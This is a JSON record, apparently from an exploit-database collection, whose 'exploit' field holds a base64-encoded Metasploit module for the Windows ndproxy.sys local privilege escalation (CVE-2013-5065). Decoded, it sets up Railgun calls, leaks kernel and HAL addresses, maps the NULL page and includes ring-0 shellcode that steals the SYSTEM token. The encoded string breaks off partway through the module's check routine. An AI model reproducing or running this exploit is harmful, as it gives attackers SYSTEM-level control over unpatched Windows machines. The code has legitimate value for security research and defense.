{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBtb2R1bGUgcmVxdWlyZXMgTWV0YXNwbG9pdDogaHR0cC8vbWV0YXNwbG9pdC5jb20vZG93bmxvYWQNCiMgQ3VycmVudCBzb3VyY2U6IGh0dHBzOi8vZ2l0aHViLmNvbS9yYXBpZDcvbWV0YXNwbG9pdC1mcmFtZXdvcmsNCiMjDQoNCnJlcXVpcmUgJ21zZi9jb3JlJw0KcmVxdWlyZSAncmV4Jw0KDQpjbGFzcyBNZXRhc3Bsb2l0MyA8IE1zZjo6RXhwbG9pdDo6TG9jYWwNCiAgUmFuayA9IEF2ZXJhZ2VSYW5raW5nDQoNCiAgaW5jbHVkZSBNc2Y6OlBvc3Q6OkZpbGUNCiAgaW5jbHVkZSBNc2Y6OlBvc3Q6OldpbmRvd3M6OlByaXYNCiAgaW5jbHVkZSBNc2Y6OlBvc3Q6OldpbmRvd3M6OlByb2Nlc3MNCg0KICBkZWYgaW5pdGlhbGl6ZShpbmZvPXt9KQ0KICAgIHN1cGVyKHVwZGF0ZV9pbmZvKGluZm8sIHsNCiAgICAgICdOYW1lJyAgICAgICAgICA9PiAnTWljcm9zb2Z0IFdpbmRvd3MgbmRwcm94eS5zeXMgTG9jYWwgUHJpdmlsZWdlIEVzY2FsYXRpb24nLA0KICAgICAgJ0Rlc2NyaXB0aW9uJyAgICA9PiAlcXsNCiAgICAgICAgVGhpcyBtb2R1bGUgZXhwbG9pdHMgYSBmbGF3IGluIHRoZSBuZHByb3h5LnN5cyBkcml2ZXIgb24gV2luZG93cyBYUCBTUDMgYW5kIFdpbmRvd3MgMjAwMw0KICAgICAgICBTUDIgc3lzdGVtcywgZXhwbG9pdGVkIGluIHRoZSB3aWxkIGluIE5vdmVtYmVyLCAyMDEzLiBUaGUgdnVsbmVyYWJpbGl0eSBleGlzdHMgd2hpbGUNCiAgICAgICAgcHJvY2Vzc2luZyBhbiBJTyBDb250cm9sIENvZGUgMHg4ZmZmMjNjOCBvciAweDhmZmYyM2NjLCB3aGVyZSB1c2VyIHByb3ZpZGVkIGlucHV0IGlzIHVzZWQNCiAgICAgICAgdG8gYWNjZXNzIGFuIGFycmF5IHVuc2FmZWx5LCBhbmQgdGhlIHZhbHVlIGlzIHVzZWQgdG8gcGVyZm9ybSBhIGNhbGwsIGxlYWRpbmcgdG8gYSBOVUxMDQogICAgICAgIHBvaW50ZXIgZGVyZWZlcmVuY2Ugd2hpY2ggaXMgZXhwbG9pdGFibGUgb24gYm90aCBXaW5kb3dzIFhQIGFuZCBXaW5kb3dzIDIwMDMgc3lzdGVtcy4gVGhpcw0KICAgICAgICBtb2R1bGUgaGFzIGJlZW4gdGVzdGVkIHN1Y2Nlc3NmdWxseSBvbiBXaW5kb3dzIFhQIFNQMyBhbmQgV2luZG93cyAyMDAzIFNQMi4gSW4gb3JkZXIgdG8NCiAgICAgICAgd29yayB0aGUgc2VydmljZSAiUm91dGluZyBhbmQgUmVtb3RlIEFjY2VzcyIgbXVzdCBiZSBydW5uaW5nIG9uIHRoZSB0YXJnZXQgc3lzdGVtLg0KICAgICAgfSwNCiAgICAgICdMaWNlbnNlJyAgICAgICA9PiBNU0ZfTElDRU5TRSwNCiAgICAgICdBdXRob3InICAgICAgICA9Pg0KICAgICAgICBbDQogICAgICAgICAgJ1Vua25vd24nLCAjIFZ1bG5lcmFiaWxpdHkgZGlzY292ZXJ5DQogICAgICAgICAgJ3J5dWppbicsICMgcHl0aG9uIFBvQw0KICAgICAgICAgICdTaGFoaW4gUmFtZXphbnknLCAjIEMgUG9DDQogICAgICAgICAgJ2p1YW4gdmF6cXVleicgIyBNU0YgbW9kdWxlDQogICAgICAgIF0sDQogICAgICAnQXJjaCcgICAgICAgICAgPT4gQVJDSF9YODYsDQogICAgICAnUGxhdGZvcm0nICAgICAgPT4gJ3dpbicsDQogICAgICAnUGF5bG9hZCcgICAgICAgPT4NCiAgICAgICAgew0KICAgICAgICAgICdTcGFjZScgPT4gNDA5NiwNCiAgICAgICAgICAnRGlzYWJsZU5vcHMnID0+IHRydWUNCiAgICAgICAgfSwNCiAgICAgICdTZXNzaW9uVHlwZXMnICA9PiBbICdtZXRlcnByZXRlcicgXSwNCiAgICAgICdEZWZhdWx0T3B0aW9ucycgPT4NCiAgICAgICAgew0KICAgICAgICAgICdFWElURlVOQycgPT4gJ3RocmVhZCcsDQogICAgICAgIH0sDQogICAgICAnVGFyZ2V0cycgICAgICAgPT4NCiAgICAgICAgWw0KICAgICAgICAgIFsgJ0F1dG9tYXRpYycsIHsgfSBdLA0KICAgICAgICAgIFsgJ1dpbmRvd3MgWFAgU1AzJywNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgJ0hhbGlRdWVyeVN5c3RlbUluZm8nID0+IDB4MTZiYmEsICMgU3RhYmxlIG92ZXIgV2luZG93cyBYUCBTUDMgdXBkYXRlcw0KICAgICAgICAgICAgICAnX0tQUk9DRVNTJyA9PiAiXHg0NCIsICMgT2Zmc2V0IHRvIF9LUFJPQ0VTUyBmcm9tIGEgX0VUSFJFQUQgc3RydWN0DQogICAgICAgICAgICAgICdfVE9LRU4nID0+ICJceGM4IiwgICAgIyBPZmZzZXQgdG8gVE9LRU4gZnJvbSB0aGUgX0VQUk9DRVNTIHN0cnVjdA0KICAgICAgICAgICAgICAnX1VQSUQnID0+ICJceDg0IiwgICAgICMgT2Zmc2V0IHRvIFVuaXF1ZVByb2Nlc3NJZCBGUk9NIHRoZSBfRVBST0NFU1Mgc3RydWN0DQogICAgICAgICAgICAgICdfQVBMSU5LUycgPT4gIlx4ODgiICAgIyBPZmZzZXQgdG8gQWN0aXZlUHJvY2Vzc0xpbmtzIF9FUFJPQ0VTUyBzdHJ1Y3QNCiAgICAgICAgICAgIH0NCiAgICAgICAgICBdLA0KICAgICAgICAgIFsgJ1dpbmRvd3MgU2VydmVyIDIwMDMgU1AyJywNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgJ0hhbGlRdWVyeVN5c3RlbUluZm8nID0+IDB4MWZhMWUsDQogICAgICAgICAgICAgICdfS1BST0NFU1MnID0+ICJceDM4IiwNCiAgICAgICAgICAgICAgJ19UT0tFTicgPT4gIlx4ZDgiLA0KICAgICAgICAgICAgICAnX1VQSUQnID0+ICJceDk0IiwNCiAgICAgICAgICAgICAgJ19BUExJTktTJyA9PiAiXHg5OCINCiAgICAgICAgICAgIH0NCiAgICAgICAgICBdDQogICAgICAgIF0sDQogICAgICAnUmVmZXJlbmNlcycgICAgPT4NCiAgICAgICAgWw0KICAgICAgICAgIFsgJ0NWRScsICcyMDEzLTUwNjUnIF0sDQogICAgICAgICAgWyAnT1NWREInICwgJzEwMDM2OCddLA0KICAgICAgICAgIFsgJ0JJRCcsICc2Mzk3MScgXSwNCiAgICAgICAgICBbICdFREInLCAnMzAwMTQnIF0sDQogICAgICAgICAgWyAnVVJMJywgJ2h0dHA6Ly9sYWJzLnBvcnRjdWxsaXMuY28udWsvYmxvZy9jdmUtMjAxMy01MDY1LW5kcHJveHktYXJyYXktaW5kZXhpbmctZXJyb3ItdW5wYXRjaGVkLXZ1bG5lcmFiaWxpdHkvJyBdLA0KICAgICAgICAgIFsgJ1VSTCcsICdodHRwOi8vdGVjaG5ldC5taWNyb3NvZnQuY29tL2VuLXVzL3NlY3VyaXR5L2Fkdmlzb3J5LzI5MTQ0ODYnXSwNCiAgICAgICAgICBbICdVUkwnLCAnaHR0cHM6Ly9naXRodWIuY29tL1NoYWhpblJhbWV6YW55L0NvZGVzL2Jsb2IvbWFzdGVyL0NWRS0yMDEzLTUwNjUvQ1ZFLTIwMTMtNTA2NS5jcHAnIF0sDQogICAgICAgICAgWyAnVVJMJywgJ2h0dHA6Ly93d3cuc2Vjbml1LmNvbS9ibG9nLz9wPTUzJyBdLA0KICAgICAgICAgIFsgJ1VSTCcsICdodHRwOi8vd3d3LmZpcmVleWUuY29tL2Jsb2cvdGVjaG5pY2FsL2N5YmVyLWV4cGxvaXRzLzIwMTMvMTEvbXMtd2luZG93cy1sb2NhbC1wcml2aWxlZ2UtZXNjYWxhdGlvbi16ZXJvLWRheS1pbi10aGUtd2lsZC5odG1sJyBdLA0KICAgICAgICAgIFsgJ1VSTCcsICdodHRwOi8vYmxvZy5zcGlkZXJsYWJzLmNvbS8yMDEzLzEyL3RoZS1rZXJuZWwtaXMtY2FsbGluZy1hLXplcm9kYXktcG9pbnRlci1jdmUtMjAxMy01MDY1LXJpbmctcmluZy5odG1sJyBdDQogICAgICAgIF0sDQogICAgICAnRGlzY2xvc3VyZURhdGUnPT4gJ05vdiAyNyAyMDEzJywNCiAgICAgICdEZWZhdWx0VGFyZ2V0JyA9PiAwDQogICAgfSkpDQoNCiAgZW5kDQoNCiAgZGVmIGFkZF9yYWlsZ3VuX2Z1bmN0aW9ucw0KICAgIHNlc3Npb24ucmFpbGd1bi5hZGRfZnVuY3Rpb24oDQogICAgICAnbnRkbGwnLA0KICAgICAgJ050QWxsb2NhdGVWaXJ0dWFsTWVtb3J5JywNCiAgICAgICdEV09SRCcsDQogICAgICBbDQogICAgICAgIFsiRFdPUkQiLCAiUHJvY2Vzc0hhbmRsZSIsICJpbiJdLA0KICAgICAgICBbIlBCTE9CIiwgIkJhc2VBZGRyZXNzIiwgImlub3V0Il0sDQogICAgICAgIFsiUERXT1JEIiwgIlplcm9CaXRzIiwgImluIl0sDQogICAgICAgIFsiUEJMT0IiLCAiUmVnaW9uU2l6ZSIsICJpbm91dCJdLA0KICAgICAgICBbIkRXT1JEIiwgIkFsbG9jYXRpb25UeXBlIiwgImluIl0sDQogICAgICAgIFsiRFdPUkQiLCAiUHJvdGVjdCIsICJpbiJdDQogICAgICBdKQ0KDQogICAgc2Vzc2lvbi5yYWlsZ3VuLmFkZF9mdW5jdGlvbigNCiAgICAgICdudGRsbCcsDQogICAgICAnTnREZXZpY2VJb0NvbnRyb2xGaWxlJywNCiAgICAgICdEV09SRCcsDQogICAgICBbDQogICAgICAgIFsgIkRXT1JEIiwgIkZpbGVIYW5kbGUiLCAiaW4iIF0sDQogICAgICAgIFsgIkRXT1JEIiwgIkV2ZW50IiwgImluIiBdLA0KICAgICAgICBbICJEV09SRCIsICJBcGNSb3V0aW5lIiwgImluIiBdLA0KICAgICAgICBbICJEV09SRCIsICJBcGNDb250ZXh0IiwgImluIiBdLA0KICAgICAgICBbICJQRFdPUkQiLCAiSW9TdGF0dXNCbG9jayIsICJvdXQiIF0sDQogICAgICAgIFsgIkRXT1JEIiwgIklvQ29udHJvbENvZGUiLCAiaW4iIF0sDQogICAgICAgIFsgIkxQVk9JRCIsICJJbnB1dEJ1ZmZlciIsICJpbiIgXSwNCiAgICAgICAgWyAiRFdPUkQiLCAiSW5wdXRCdWZmZXJMZW5ndGgiLCAiaW4iIF0sDQogICAgICAgIFsgIkxQVk9JRCIsICJPdXRwdXRCdWZmZXIiLCAiaW4iIF0sDQogICAgICAgIFsgIkRXT1JEIiwgIk91dFB1dEJ1ZmZlckxlbmd0aCIsICJpbiIgXQ0KICAgICAgXSkNCg0KICAgIHNlc3Npb24ucmFpbGd1bi5hZGRfZnVuY3Rpb24oDQogICAgICAnbnRkbGwnLA0KICAgICAgJ050UXVlcnlJbnRlcnZhbFByb2ZpbGUnLA0KICAgICAgJ0RXT1JEJywNCiAgICAgIFsNCiAgICAgICAgWyAiRFdPUkQiLCAiUHJvZmlsZVNvdXJjZSIsICJpbiIgXSwNCiAgICAgICAgWyAiUERXT1JEIiwgIkludGVydmFsIiwgIm91dCIgXQ0KICAgICAgXSkNCiAgICBzZXNzaW9uLnJhaWxndW4uYWRkX2RsbCgncHNhcGknKSB1bmxlc3Mgc2Vzc2lvbi5yYWlsZ3VuLmRsbHMua2V5cy5pbmNsdWRlPygncHNhcGknKQ0KICAgIHNlc3Npb24ucmFpbGd1bi5hZGRfZnVuY3Rpb24oDQogICAgICAncHNhcGknLA0KICAgICAgJ0VudW1EZXZpY2VEcml2ZXJzJywNCiAgICAgICdCT09MJywNCiAgICAgIFsNCiAgICAgICAgWyJQQkxPQiIsICJscEltYWdlQmFzZSIsICJvdXQiXSwNCiAgICAgICAgWyJEV09SRCIsICJjYiIsICJpbiJdLA0KICAgICAgICBbIlBEV09SRCIsICJscGNiTmVlZGVkIiwgIm91dCJdDQogICAgICBdKQ0KICAgIHNlc3Npb24ucmFpbGd1bi5hZGRfZnVuY3Rpb24oDQogICAgICAncHNhcGknLA0KICAgICAgJ0dldERldmljZURyaXZlckJhc2VOYW1lQScsDQogICAgICAnRFdPUkQnLA0KICAgICAgWw0KICAgICAgICBbIkxQVk9JRCIsICJJbWFnZUJhc2UiLCAiaW4iXSwNCiAgICAgICAgWyJQQkxPQiIsICJscEJhc2VOYW1lIiwgIm91dCJdLA0KICAgICAgICBbIkRXT1JEIiwgIm5TaXplIiwgImluIl0NCiAgICAgIF0pDQogIGVuZA0KDQogIGRlZiBvcGVuX2RldmljZShkZXYpDQoNCiAgICBpbnZhbGlkX2hhbmRsZV92YWx1ZSA9IDB4RkZGRkZGRkYNCg0KICAgIHIgPSBzZXNzaW9uLnJhaWxndW4ua2VybmVsMzIuQ3JlYXRlRmlsZUEoZGV2LCAweDAsIDB4MCwgbmlsLCAweDMsIDAsIDApDQoNCiAgICBoYW5kbGUgPSByWydyZXR1cm4nXQ0KDQogICAgaWYgaGFuZGxlID09IGludmFsaWRfaGFuZGxlX3ZhbHVlDQogICAgICByZXR1cm4gbmlsDQogICAgZW5kDQoNCiAgICByZXR1cm4gaGFuZGxlDQogIGVuZA0KDQogIGRlZiBmaW5kX3N5c19iYXNlKGRydm5hbWUpDQogICAgcmVzdWx0cyA9IHNlc3Npb24ucmFpbGd1bi5wc2FwaS5FbnVtRGV2aWNlRHJpdmVycyg0MDk2LCAxMDI0LCA0KQ0KICAgIGFkZHJlc3NlcyA9IHJlc3VsdHNbJ2xwSW1hZ2VCYXNlJ11bMC4ucmVzdWx0c1snbHBjYk5lZWRlZCddIC0gMV0udW5wYWNrKCJMKiIpDQoNCiAgICBhZGRyZXNzZXMuZWFjaCBkbyB8YWRkcmVzc3wNCiAgICAgIHJlc3VsdHMgPSBzZXNzaW9uLnJhaWxndW4ucHNhcGkuR2V0RGV2aWNlRHJpdmVyQmFzZU5hbWVBKGFkZHJlc3MsIDQ4LCA0OCkNCiAgICAgIGN1cnJlbnRfZHJ2bmFtZSA9IHJlc3VsdHNbJ2xwQmFzZU5hbWUnXVswLi5yZXN1bHRzWydyZXR1cm4nXSAtIDFdDQogICAgICBpZiBkcnZuYW1lID09IG5pbA0KICAgICAgICBpZiBjdXJyZW50X2Rydm5hbWUuZG93bmNhc2UuaW5jbHVkZT8oJ2tybmwnKQ0KICAgICAgICAgIHJldHVybiBbYWRkcmVzcywgY3VycmVudF9kcnZuYW1lXQ0KICAgICAgICBlbmQNCiAgICAgIGVsc2lmIGRydm5hbWUgPT0gcmVzdWx0c1snbHBCYXNlTmFtZSddWzAuLnJlc3VsdHNbJ3JldHVybiddIC0gMV0NCiAgICAgICAgcmV0dXJuIFthZGRyZXNzLCBjdXJyZW50X2Rydm5hbWVdDQogICAgICBlbmQNCiAgICBlbmQNCg0KICAgIHJldHVybiBuaWwNCiAgZW5kDQoNCiAgZGVmIHJpbmcwX3NoZWxsY29kZSh0KQ0KICAgIHJlc3RvcmVfcHRycyA9ICAiXHgzMVx4YzAiICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyB4b3IgZWF4LCBlYXgNCiAgICByZXN0b3JlX3B0cnMgPDwgIlx4YjgiICsgWyBAYWRkcmVzc2VzWyJIYWxpUXVlcnlTeXN0ZW1JbmZvIl0gXS5wYWNrKCJMIikgICMgbW92IGVheCwgb2Zmc2V0IGhhbCFIYWxpUXVlcnlTeXN0ZW1JbmZvcm1hdGlvbg0KICAgIHJlc3RvcmVfcHRycyA8PCAiXHhhMyIgKyBbIEBhZGRyZXNzZXNbImhhbERpc3BhdGNoVGFibGUiXSArIDQgXS5wYWNrKCJMIikgIyBtb3YgZHdvcmQgcHRyIFtudCFIYWxEaXNwYXRjaFRhYmxlKzB4NF0sIGVheA0KDQogICAgdG9rZW5zdGVhbGluZyA9ICAiXHg1MiIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIHB1c2ggZWR4ICAgICAgICAgICAgICAgICAgICAgICAgICMgU2F2ZSBlZHggb24gdGhlIHN0YWNrDQogICAgdG9rZW5zdGVhbGluZyA8PCAiXHg1MyIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIHB1c2ggZWJ4ICAgICAgICAgICAgICAgICAgICAgICAgICMgU2F2ZSBlYnggb24gdGhlIHN0YWNrDQogICAgdG9rZW5zdGVhbGluZyA8PCAiXHgzM1x4YzAiICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIHhvciBlYXgsIGVheCAgICAgICAgICAgICAgICAgICAgICMgZWF4ID0gMA0KICAgIHRva2Vuc3RlYWxpbmcgPDwgIlx4NjRceDhiXHg4MFx4MjRceDAxXHgwMFx4MDAiICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBtb3YgZWF4LCBkd29yZCBwdHIgZnM6W2VheCsxMjRoXSAjIFJldHJpZXZlIEVUSFJFQUQNCiAgICB0b2tlbnN0ZWFsaW5nIDw8ICJceDhiXHg0MCIgKyB0WydfS1BST0NFU1MnXSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgbW92IGVheCwgZHdvcmQgcHRyIFtlYXgrNDRoXSAgICAgIyBSZXRyaWV2ZSBfS1BST0NFU1MNCiAgICB0b2tlbnN0ZWFsaW5nIDw8ICJceDhiXHhjOCIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgbW92IGVjeCwgZWF4DQogICAgdG9rZW5zdGVhbGluZyA8PCAiXHg4Ylx4OTgiICsgdFsnX1RPS0VOJ10gKyAiXHgwMFx4MDBceDAwIiAgICAgICAgICAgICAgICAjIG1vdiBlYngsIGR3b3JkIHB0ciBbZWF4KzBDOGhdICAgICMgUmV0cmlldmVzIFRPS0VODQogICAgdG9rZW5zdGVhbGluZyA8PCAiXHg4Ylx4ODAiICsgdFsnX0FQTElOS1MnXSArICJceDAwXHgwMFx4MDAiICAgICAgICAgICAgICAjIG1vdiBlYXgsIGR3b3JkIHB0ciBbZWF4Kzg4aF0gIDw9PT09fCAjIFJldHJpZXZlIEZMSU5LIGZyb20gQWN0aXZlUHJvY2Vzc0xpbmtzDQogICAgdG9rZW5zdGVhbGluZyA8PCAiXHg4MVx4ZTgiICsgdFsnX0FQTElOS1MnXSArICJceDAwXHgwMFx4MDAiICAgICAgICAgICAgICAjIHN1YiBlYXgsODhoICAgICAgICAgICAgICAgICAgICAgICAgfCAjIFJldHJpZXZlIF9FUFJPQ0VTUyBQb2ludGVyIGZyb20gdGhlIEFjdGl2ZVByb2Nlc3NMaW5rcw0KICAgIHRva2Vuc3RlYWxpbmcgPDwgIlx4ODFceGI4IiArIHRbJ19VUElEJ10gKyAiXHgwMFx4MDBceDAwXHgwNFx4MDBceDAwXHgwMCIgIyBjbXAgZHdvcmQgcHRyIFtlYXgrODRoXSwgNCAgICAgICAgIHwgIyBDb21wYXJlcyBVbmlxdWVQcm9jZXNzSWQgd2l0aCA0IChUaGUgU3lzdGVtIFByb2Nlc3Mgb24gV2luZG93cyBYUCkNCiAgICB0b2tlbnN0ZWFsaW5nIDw8ICJceDc1XHhlOCIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgam5lIDAwMDAxMDFlID09PT09PT09PT09PT09PT09PT09PT0NCiAgICB0b2tlbnN0ZWFsaW5nIDw8ICJceDhiXHg5MCIgKyB0WydfVE9LRU4nXSArICJceDAwXHgwMFx4MDAiICAgICAgICAgICAgICAgICMgbW92IGVkeCxkd29yZCBwdHIgW2VheCswQzhoXSAgICAgIyBSZXRyaWV2ZXMgVE9LRU4gYW5kIHN0b3JlcyBvbiBFRFgNCiAgICB0b2tlbnN0ZWFsaW5nIDw8ICJceDhiXHhjMSIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgbW92IGVheCwgZWN4ICAgICAgICAgICAgICAgICAgICAgIyBSZXRyaWV2ZXMgS1BST0NFU1Mgc3RvcmVkIG9uIEVDWA0KICAgIHRva2Vuc3RlYWxpbmcgPDwgIlx4ODlceDkwIiArIHRbJ19UT0tFTiddICsgIlx4MDBceDAwXHgwMCIgICAgICAgICAgICAgICAgIyBtb3YgZHdvcmQgcHRyIFtlYXgrMEM4aF0sZWR4ICAgICAjIE92ZXJ3cml0ZXMgdGhlIFRPS0VOIGZvciB0aGUgY3VycmVudCBLUFJPQ0VTUw0KICAgIHRva2Vuc3RlYWxpbmcgPDwgIlx4NWIiICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBwb3AgZWJ4ICAgICAgICAgICAgICAgICAgICAgICAgICAjIFJlc3RvcmVzIGVieA0KICAgIHRva2Vuc3RlYWxpbmcgPDwgIlx4NWEiICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBwb3AgZWR4ICAgICAgICAgICAgICAgICAgICAgICAgICAjIFJlc3RvcmVzIGVkeA0KICAgIHRva2Vuc3RlYWxpbmcgPDwgIlx4YzJceDEwIiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyByZXQgMTBoICAgICAgICAgICAgICAgICAgICAgICAgICAjIEF3YXkgZnJvbSB0aGUga2VybmVsIQ0KDQogICAgcmluZzBfc2hlbGxjb2RlID0gcmVzdG9yZV9wdHJzICsgdG9rZW5zdGVhbGluZw0KICAgIHJldHVybiByaW5nMF9zaGVsbGNvZGUNCiAgZW5kDQoNCiAgZGVmIGZpbGxfbWVtb3J5KHByb2MsIGFkZHJlc3MsIGxlbmd0aCwgY29udGVudCkNCg0KICAgIHJlc3VsdCA9IHNlc3Npb24ucmFpbGd1bi5udGRsbC5OdEFsbG9jYXRlVmlydHVhbE1lbW9yeSgtMSwgWyBhZGRyZXNzIF0ucGFjaygiTCIpLCBuaWwsIFsgbGVuZ3RoIF0ucGFjaygiTCIpLCAiTUVNX1JFU0VSVkV8TUVNX0NPTU1JVHxNRU1fVE9QX0RPV04iLCAiUEFHRV9FWEVDVVRFX1JFQURXUklURSIpDQoNCiAgICB1bmxlc3MgcHJvYy5tZW1vcnkud3JpdGFibGU/KGFkZHJlc3MpDQogICAgICB2cHJpbnRfZXJyb3IoIkZhaWxlZCB0byBhbGxvY2F0ZSBtZW1vcnkiKQ0KICAgICAgcmV0dXJuIG5pbA0KICAgIGVuZA0KDQogICAgdnByaW50X2dvb2QoIiN7YWRkcmVzc30gaXMgbm93IHdyaXRhYmxlIikNCg0KICAgIHJlc3VsdCA9IHByb2MubWVtb3J5LndyaXRlKGFkZHJlc3MsIGNvbnRlbnQpDQoNCiAgICBpZiByZXN1bHQubmlsPw0KICAgICAgdnByaW50X2Vycm9yKCJGYWlsZWQgdG8gd3JpdGUgY29udGVudHMgdG8gbWVtb3J5IikNCiAgICAgIHJldHVybiBuaWwNCiAgICBlbHNlDQogICAgICB2cHJpbnRfZ29vZCgiQ29udGVudHMgc3VjY2Vzc2Z1bGx5IHdyaXR0ZW4gdG8gMHgje2FkZHJlc3MudG9fcygxNil9IikNCiAgICBlbmQNCg0KICAgIHJldHVybiBhZGRyZXNzDQogIGVuZA0KDQogIGRlZiBjcmVhdGVfcHJvYw0KICAgIHdpbmRpciA9IGV4cGFuZF9wYXRoKCIld2luZGlyJSIpDQogICAgY21kID0gIiN7d2luZGlyfVxcU3lzdGVtMzJcXG5vdGVwYWQuZXhlIg0KICAgICMgcnVuIGhpZGRlbg0KICAgIGJlZ2luDQogICAgICBwcm9jID0gc2Vzc2lvbi5zeXMucHJvY2Vzcy5leGVjdXRlKGNtZCwgbmlsLCB7J0hpZGRlbicgPT4gdHJ1ZSB9KQ0KICAgIHJlc2N1ZSBSZXg6OlBvc3Q6Ok1ldGVycHJldGVyOjpSZXF1ZXN0RXJyb3INCiAgICAgICMgd2hlbiBydW5uaW5nIGZyb20gdGhlIEFkb2JlIFJlYWRlciBzYW5kYm94Og0KICAgICAgIyBFeHBsb2l0IGZhaWxlZDogUmV4OjpQb3N0OjpNZXRlcnByZXRlcjo6UmVxdWVzdEVycm9yIHN0ZGFwaV9zeXNfcHJvY2Vzc19leGVjdXRlOiBPcGVyYXRpb24gZmFpbGVkOiBBY2Nlc3MgaXMgZGVuaWVkLg0KICAgICAgcmV0dXJuIG5pbA0KICAgIGVuZA0KDQogICAgcmV0dXJuIHByb2MucGlkDQogIGVuZA0KDQogIGRlZiBkaXNjbG9zZV9hZGRyZXNzZXModCkNCiAgICBhZGRyZXNzZXMgPSB7fQ0KDQogICAgdnByaW50X3N0YXR1cygiR2V0dGluZyB0aGUgS2VybmVsIG1vZHVsZSBuYW1lLi4uIikNCiAgICBrZXJuZWxfaW5mbyA9IGZpbmRfc3lzX2Jhc2UobmlsKQ0KICAgIGlmIGtlcm5lbF9pbmZvLm5pbD8NCiAgICAgIHZwcmludF9lcnJvcigiRmFpbGVkIHRvIGRpc2Nsb3NlIHRoZSBLZXJuZWwgbW9kdWxlIG5hbWUiKQ0KICAgICAgcmV0dXJuIG5pbA0KICAgIGVuZA0KICAgIHZwcmludF9nb29kKCJLZXJuZWwgbW9kdWxlIGZvdW5kOiAje2tlcm5lbF9pbmZvWzFdfSIpDQoNCiAgICB2cHJpbnRfc3RhdHVzKCJHZXR0aW5nIGEgS2VybmVsIGhhbmRsZS4uLiIpDQogICAga2VybmVsMzJfaGFuZGxlID0gc2Vzc2lvbi5yYWlsZ3VuLmtlcm5lbDMyLkxvYWRMaWJyYXJ5RXhBKGtlcm5lbF9pbmZvWzFdLCAwLCAxKQ0KICAgIGtlcm5lbDMyX2hhbmRsZSA9IGtlcm5lbDMyX2hhbmRsZVsncmV0dXJuJ10NCiAgICBpZiBrZXJuZWwzMl9oYW5kbGUgPT0gMA0KICAgICAgdnByaW50X2Vycm9yKCJGYWlsZWQgdG8gZ2V0IGEgS2VybmVsIGhhbmRsZSIpDQogICAgICByZXR1cm4gbmlsDQogICAgZW5kDQogICAgdnByaW50X2dvb2QoIktlcm5lbCBoYW5kbGUgYWNxdWlyZWQiKQ0KDQoNCiAgICB2cHJpbnRfc3RhdHVzKCJEaXNjbG9zaW5nIHRoZSBIYWxEaXNwYXRjaFRhYmxlLi4uIikNCiAgICBoYWxfZGlzcGF0Y2hfdGFibGUgPSBzZXNzaW9uLnJhaWxndW4ua2VybmVsMzIuR2V0UHJvY0FkZHJlc3Moa2VybmVsMzJfaGFuZGxlLCAiSGFsRGlzcGF0Y2hUYWJsZSIpDQogICAgaGFsX2Rpc3BhdGNoX3RhYmxlID0gaGFsX2Rpc3BhdGNoX3RhYmxlWydyZXR1cm4nXQ0KICAgIGlmIGhhbF9kaXNwYXRjaF90YWJsZSA9PSAwDQogICAgICB2cHJpbnRfZXJyb3IoIkZhaWxlZCB0byBkaXNjbG9zZSB0aGUgSGFsRGlzcGF0Y2hUYWJsZSIpDQogICAgICByZXR1cm4gbmlsDQogICAgZW5kDQogICAgaGFsX2Rpc3BhdGNoX3RhYmxlIC09IGtlcm5lbDMyX2hhbmRsZQ0KICAgIGhhbF9kaXNwYXRjaF90YWJsZSArPSBrZXJuZWxfaW5mb1swXQ0KICAgIGFkZHJlc3Nlc1siaGFsRGlzcGF0Y2hUYWJsZSJdID0gaGFsX2Rpc3BhdGNoX3RhYmxlDQogICAgdnByaW50X2dvb2QoIkhhbERpc3BhdGNoVGFibGUgZm91bmQgYXQgMHgje2FkZHJlc3Nlc1siaGFsRGlzcGF0Y2hUYWJsZSJdLnRvX3MoMTYpfSIpDQoNCiAgICB2cHJpbnRfc3RhdHVzKCJHZXR0aW5nIHRoZSBoYWwuZGxsIEJhc2UgQWRkcmVzcy4uLiIpDQogICAgaGFsX2luZm8gPSBmaW5kX3N5c19iYXNlKCJoYWwuZGxsIikNCiAgICBpZiBoYWxfaW5mby5uaWw/DQogICAgICB2cHJpbnRfZXJyb3IoIkZhaWxlZCB0byBkaXNjbG9zZSBoYWwuZGxsIEJhc2UgQWRkcmVzcyIpDQogICAgICByZXR1cm4gbmlsDQogICAgZW5kDQogICAgaGFsX2Jhc2UgPSBoYWxfaW5mb1swXQ0KICAgIHZwcmludF9nb29kKCJoYWwuZGxsIEJhc2UgQWRkcmVzcyBkaXNjbG9zZWQgYXQgMHgje2hhbF9iYXNlLnRvX3MoMTYpfSIpDQoNCiAgICBoYWxpX3F1ZXJ5X3N5c3RlbV9pbmZvcm1hdGlvbiA9IGhhbF9iYXNlICsgdFsnSGFsaVF1ZXJ5U3lzdGVtSW5mbyddDQogICAgYWRkcmVzc2VzWyJIYWxpUXVlcnlTeXN0ZW1JbmZvIl0gPSBoYWxpX3F1ZXJ5X3N5c3RlbV9pbmZvcm1hdGlvbg0KDQogICAgdnByaW50X2dvb2QoIkhhbGlRdWVyeVN5c3RlbUluZm8gQWRkcmVzcyBkaXNjbG9zZWQgYXQgMHgje2FkZHJlc3Nlc1siSGFsaVF1ZXJ5U3lzdGVtSW5mbyJdLnRvX3MoMTYpfSIpDQogICAgcmV0dXJuIGFkZHJlc3Nlcw0KICBlbmQNCg0KDQogIGRlZiBjaGVjaw0KICAgIHZwcmludF9zdGF0dXMoIkFkZGluZyB0aGUgcmFpb